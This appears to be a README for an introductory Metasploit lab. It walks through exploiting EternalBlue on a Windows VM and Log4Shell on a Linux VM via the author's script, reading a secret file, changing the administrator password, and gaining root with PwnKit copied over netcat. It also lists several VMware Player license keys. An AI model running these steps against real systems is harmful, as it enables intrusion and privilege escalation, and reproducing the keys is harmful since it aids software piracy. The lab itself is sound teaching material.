# IntroMetasploit

BY : :flying_saucer: Cr4zyD14m0nd :milky_way:

## Summary:

Metasploit introduction.

Tasks to do:

1. Exploit an eternal blue vulnarability in windows.
2. Exploit a log4j vulnerability in Linux.

## Description

We will make an attack to two machines and escalate privilege.

- Parrot OS, is an operative system maded for pentesters by pentesters based on debian, it is open source.

- Scripts maded by Cr4zyD14m0nd, these scripts will automate some boring tasks like the instalation of some tools, this scipts are maded in bash.

- Metasploit framework is a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers.

- EternalBlue exploits SMBv1 vulnerabilities to insert malicious data packets and spread malware over the network. The exploit makes use of the way Microsoft Windows handles, or rather mishandles, specially crafted packets from malicious attackers.

- The Log4j vulnerability allows malicious attackers to execute code remotely on any targeted computer. What is Log4j : Log4j an open source software, a logging library for Java, is widely used by businesses and web portals. Earlier this month, this open source software was in the news for its vulnerabilities.

## Steps To Reproduce:

1. Set up

    1. Download vmware or virtualbox [1]
    Keys for vmware Plater 16.1.1
    ZF3R0-FHED2-M80TY-8QYGC-NPKYF
    YF390-0HF8P-M81RQ-2DXQE-M2UT6
    ZF71R-DMX85-08DQY-8YMNC-PPHV8
    AZ3E8-DCD8J-0842Z-N6NZE-XPKYF
    2. Download Parrot iso or parrot for vms [2]
    3. Follow the links of how to install vmware [3]
    4. Follow the links of how to setup parrot in vmware [4]
    5. Verify that you are using Host only in your parrot machine [5]
    6. Donwload the linux and the windows machines and open it in virtualbox, if you do this in vmware you will get an error message. [6]
    7. Now put the Host Only adapter to the machines. [7]
    8. Turn on your parrot maching and login [8]
    9. Turn on the windows machine and the ubuntu machine [9]
    10. make a git clone from Cr4zyD14m0nd repository from this repository: https://github.com/Cr4zyD14m0nd/TareaSocialEngennering (git clone 'url') [10]

### Windows machine.

1. Windows Attack

    1. In the folder MetasploitIntro you have a script, before do anything you need to be a root user.

        `sudo su`
        `Enter your password`

    2. Now we need to give the permisions to the script.

        `chmod +x IntroMetasploit.sh`

    3. Now run the first script.

        `./InstalacionSetoolkit.sh`

    4. Now we have the script running and all the requirements installed, the next step is navigate through the menu.

        First exploit the windows machine choosing the option 1, once finished the process you can exit and ctrl + c to run again the script and then chose the option 2 to exploit the linux machine.

    5. Enter the required options to the script.

    6. Once you have a meterpreter session you need enter te next commands.

        `getuid`
        `shell`
        `cd ..`
        `cd ..`
        `cd Users`
        `cd Administrator`
        `cd Documents`
        `type secret.txt.txt`
    
    7. Now open a new terminal and use the root user and follow the instructions.

        type in the new terminal `rdesktop 192.168.56.10`, Enter and type yes.
        Once you have a remote desktop go to the Start button click them and navigate to control panel, once you are in the control panel section, go to add or remove accounts, go to administrator and change the password.


    ### Attacking linux

    1. Run the script IntroMetasploit.sh and chose the option 2 and enter the required parameters.

        `./IntroMetasploit.sh`

    2. Now you are in the machine, the next step is get a root user for this we will use the Pwnkit exploit.

        You can download the pwnkit exploit or use it from the folder that you downloaded at the begining

    * https://github.com/ly4k/PwnKit

    3. Now you need to open another terminal in the folder were you have the pwnkit exploit.

    4. in your first terminal type:

        `nc -l -p 1337 > Pwnkit`

    5. In the second terminal type:

        `nc -w 3 192.168.56.20 1337 < Pwnkit`

    6. Now in the first terminal give it the execute permisions to Pwnkit.

        `chmod +x Pwnkit`
    
    7. And then excecute it.

        `./Pwnkit`

    8. Now you are root, to confirm it run the next command.

        `id`
    
    ## Supporting material:

    Download Parrot iso or parrot for vms [1]

    Download vmware or virtualbox [1]
    Keys for vmware Player 16.1.1
    ZF3R0-FHED2-M80TY-8QYGC-NPKYF
    YF390-0HF8P-M81RQ-2DXQE-M2UT6
    ZF71R-DMX85-08DQY-8YMNC-PPHV8
    AZ3E8-DCD8J-0842Z-N6NZE-XPKYF

    Follow the links of how to install vmware [1]
    Follow the links of how to setup parrot in vmware [2]

    [1] https://www.parrotsec.org

    [2] https://www.youtube.com/watch?v=9QXXyG0hKtI
    
    [3] https://www.youtube.com/watch?v=NoivU2LrUrI

    [4] If you dont have the log4j exploit you can download it from here:
    [4] https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/log4shell_header_injection.rb

    [5] How to put your adapter in Host only.
    [5] https://www.youtube.com/watch?v=FlP0YUKPHGo
